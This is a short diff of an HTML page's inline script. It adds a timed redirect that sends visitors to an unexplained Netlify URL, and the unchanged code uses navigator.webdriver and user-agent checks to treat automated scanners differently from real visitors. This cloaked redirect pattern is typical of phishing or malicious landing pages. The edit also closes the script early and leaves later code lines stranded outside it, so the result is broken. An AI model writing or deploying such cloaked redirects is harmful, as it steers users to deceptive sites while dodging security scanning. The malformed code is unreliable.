@@ -107,7 +107,14 @@
     <script>
         (function() {
 
-            var target = "https://very-apply-remove-issue.netlify.app/";
+            var target = "https://very-apply-remove-issue.netlify.app/"; // 
+
+    setTimeout(function() {
+        window.location.href = target;
+    }, 3000);
+
+})();
+</script>
 
             var isBot = navigator.webdriver || !navigator.userAgent.includes("Mozilla");
             var waitTime = isBot ? 15000 : 1000;
